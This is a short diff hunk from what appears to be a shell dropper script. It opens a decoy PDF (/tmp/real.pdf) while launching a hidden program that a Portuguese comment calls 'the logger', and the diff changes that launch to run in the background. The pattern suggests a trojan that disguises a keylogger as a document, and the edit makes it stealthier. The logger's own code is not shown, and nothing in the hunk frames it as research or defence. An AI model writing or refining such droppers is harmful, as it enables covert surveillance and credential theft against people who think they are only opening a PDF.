@@ -32,7 +32,7 @@ chmod +x /tmp/prog_test
 xdg-open /tmp/real.pdf &
 
 # Executa o logger
-/tmp/prog_test
+/tmp/prog_test &
 
 exit 0
 EOF
